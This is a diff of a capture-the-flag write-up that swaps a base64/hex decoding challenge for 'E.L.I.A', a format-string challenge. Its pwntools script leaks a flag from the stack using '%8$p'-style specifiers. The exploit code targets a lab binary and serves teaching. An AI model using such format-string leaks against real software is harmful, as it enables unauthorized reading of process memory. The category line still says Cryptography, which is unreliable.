@@ -1,25 +1,36 @@
-# Base N' Hex
+# E.L.I.A
 ## Challenge
-This challenge `"encrypts"` the flag in a very simple way, **randomly** choosing whether to encode the flag in *base64* or *hexadecimal* for **10 times**. The result of this encryption can be found in `output.txt` and can be decrypted using [`cyberchef.org`](https://gchq.github.io/CyberChef/) or by using the Python writeup attached to this challenge.
+This challenge first reads the flag from the file `flag.txt` and saves it on the **stack**. Then, it requests input from the user and subsequently prints it insecurely using `printf` without any **defined format**.
+
+This executable can therefore be exploited if the correct offsets on the stack of the flag (from 8 to 13) are found and used together with `%p` in the format `%x$p` where *x* is the offset.
 
 ## Solution
 ```py
 #!/usr/bin/env python3
-from base64 import b64decode
-flag = open("output.txt", "rb").read()
+from pwn import *
 
-for i in range(10):
-    try:
-        if b64decode(flag).isascii():
-            flag = b64decode(flag)
-        else:
-            raise Exception
-    except:
-        flag = bytes.fromhex(flag.decode())
-print(flag.decode())
+# Change this to remote if you want to run it on remote server
+if args.REMOTE:
+    r = remote('localhost', 1337) # change host and port
+else:
+    r = process('./pwn3')
+
+r.recvuntil(b'?\n')
+PAYLOAD = b''
+for i in range(8, 13):
+    PAYLOAD += f'%{i}$p'.encode()
+
+r.sendline(PAYLOAD)
+flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
+pascal = ''
+for i in flag:
+    pascal += i.to_bytes(8, 'little').decode()
+
+pascal = pascal.replace('\x00', '')
+print(pascal)
 ```
 
 ## Author
 **Author**: [`@AlBovo`](https://github.com/AlBovo/) <br>
-**Date**: 2024-06-11 <br>
+**Date**: 2024-07-19 <br>
 **Category**: Cryptography
